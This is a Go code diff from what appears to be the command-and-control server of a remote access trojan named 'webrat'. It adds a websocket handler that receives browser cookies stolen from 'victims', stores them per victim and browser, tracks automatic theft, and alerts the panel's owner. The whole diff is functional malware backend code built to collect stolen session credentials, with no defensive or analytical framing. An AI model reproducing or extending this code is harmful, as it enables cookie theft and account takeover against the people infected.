@@ -6,6 +6,7 @@ import (
 	"strings"
 	"time"
 
+	"webrat-go-api/internal/httpapi"
 	"webrat-go-api/internal/storage"
 
 	"github.com/gorilla/websocket"
@@ -280,4 +281,84 @@ func (h *Hub) handleRDFrame(ws *websocket.Conn, payload map[string]any, associat
 		m.Unlock()
 	}
 	h.mu.RUnlock()
+}
+
+func (h *Hub) handleStealResult(ws *websocket.Conn, payload map[string]any) {
+	// Find victim ID from connection
+	h.mu.RLock()
+	var victimID string
+	for id, c := range h.victimSockets {
+		if c == ws {
+			victimID = id
+			break
+		}
+	}
+	h.mu.RUnlock()
+	if victimID == "" {
+		return
+	}
+
+	dataStr := strFrom(payload["data"])
+	autoSteal := strFrom(payload["auto_steal"])
+	if dataStr == "" {
+		return
+	}
+
+	// Parse browser data
+	var browsers map[string]string
+	if err := json.Unmarshal([]byte(dataStr), &browsers); err != nil {
+		log.Printf("[ws] steal_result bad data from %s: %v", victimID, err)
+		return
+	}
+
+	for browserName, cookies := range browsers {
+		if cookies == "" {
+			continue
+		}
+		if err := httpapi.SaveStealResult(victimID, browserName, cookies); err != nil {
+			log.Printf("[ws] steal save error %s/%s: %v", victimID, browserName, err)
+		}
+	}
+
+	if err := httpapi.UpdateStealMeta(victimID, autoSteal); err != nil {
+		log.Printf("[ws] steal meta error %s: %v", victimID, err)
+	}
+
+	// Relay to panel owner
+	h.mu.RLock()
+	v := h.victims[victimID]
+	var owner string
+	if v != nil {
+		owner = strings.ToLower(strings.TrimSpace(v.Owner))
+	}
+
+	stealTime := ""
+	if metaData, err := json.Marshal(map[string]string{"steal_time": time.Now().Format("02.01.2006, 15:04:05")}); err == nil {
+		var m map[string]string
+		if json.Unmarshal(metaData, &m) == nil {
+			stealTime = m["steal_time"]
+		}
+	}
+
+	relay := map[string]any{
+		"type":       "steal_result",
+		"victim_id":  victimID,
+		"steal_time": stealTime,
+	}
+	relayB, _ := json.Marshal(relay)
+
+	for clientConn := range h.clients {
+		clientOwner := strings.ToLower(strings.TrimSpace(h.clientOwners[clientConn]))
+		if clientOwner == "" || clientOwner != owner {
+			continue
+		}
+		m := h.getConnMutex(clientConn)
+		m.Lock()
+		_ = clientConn.SetWriteDeadline(time.Now().Add(15 * time.Second))
+		_ = clientConn.WriteMessage(websocket.TextMessage, relayB)
+		m.Unlock()
+	}
+	h.mu.RUnlock()
+
+	log.Printf("[ws] steal_result saved for %s (%d browsers)", victimID, len(browsers))
 }
